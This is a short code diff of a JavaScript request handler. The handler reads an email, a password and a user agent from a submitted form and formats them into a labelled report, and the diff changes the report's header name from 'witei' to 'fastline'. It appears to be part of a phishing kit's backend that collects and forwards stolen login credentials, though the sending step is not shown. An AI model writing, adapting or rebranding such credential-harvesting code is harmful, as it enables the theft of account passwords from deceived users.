@@ -11,7 +11,7 @@ module.exports = async function handler(req, res) {
     const { email, pass, agent } = req.body;
 
     const message = `
-📩  witei
+📩  fastline
 
 📧 Email: ${email}
 🔑 Pass: ${pass}
